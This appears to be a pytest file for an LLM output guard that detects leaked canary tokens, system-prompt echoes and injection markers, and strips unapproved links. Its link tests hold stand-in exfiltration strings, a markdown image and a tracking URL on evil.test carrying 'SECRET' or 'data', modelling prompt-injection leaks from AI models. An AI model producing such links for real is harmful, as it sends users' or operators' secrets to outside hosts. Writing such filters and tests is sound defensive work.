import base64

from shipguard.config import OutputConfig, TopicRule
from shipguard.filters.canary import find_canary, make_canary, system_prompt_overlap
from shipguard.filters.output_policy import check_output, host_allowed, scrub_links


def test_canary_deterministic_per_session():
    a = make_canary("s1", secret="k")
    assert a == make_canary("s1", secret="k") and a != make_canary("s2", secret="k")
    assert a.startswith("SG-CANARY-")


def test_canary_detection_variants():
    c = make_canary("s", secret="k")
    body = c.split("-")[-1]
    assert find_canary(f"marker {c}", c)
    assert find_canary(" ".join(body.upper()), c)               # spaced / case-changed
    assert find_canary(body[::-1], c)                           # reversed
    assert find_canary(base64.b64encode(c.encode()).decode(), c)
    assert find_canary(c.encode().hex(), c)
    assert not find_canary("nothing to see", c)


def test_system_prompt_overlap():
    sp = "You are LumenBot the support assistant for Lumen Goods internal notes escalation desk extension 4471"
    assert system_prompt_overlap("Sure: " + sp, sp, 10) >= 10
    assert system_prompt_overlap("You are LumenBot and I can help with lamps today friend", sp, 10) == 0


def test_markers_and_topics():
    cfg = OutputConfig(blocked_markers=["INJECTION_SUCCESS"],
                       disallowed_topics=[TopicRule(name="glimmer", patterns=[r"glimmer\s*device"])])
    kinds = [f.kind for f in check_output("injection_success! Glimmer Device steps", cfg)]
    assert kinds == ["blocked_marker", "disallowed_topic"]
    assert check_output("A normal answer", cfg) == []


def test_scrub_links():
    allowed = ["shipguard.example"]
    text, f = scrub_links("see ![x](https://img.evil.test/p.png?d=SECRET) ok", allowed)
    assert "evil.test" not in text and f[0].kind == "exfil_markdown_image"
    text, f = scrub_links("docs: https://docs.python.org/3/ and https://docs.shipguard.example/a?b=1", allowed)
    assert f == [] and "docs.python.org" in text
    text, f = scrub_links("track https://evil.test/c?q=data", allowed)
    assert "evil.test" not in text and f
    assert host_allowed("https://a.shipguard.example/x", allowed) and not host_allowed("https://shipguard.example.evil.test", allowed)
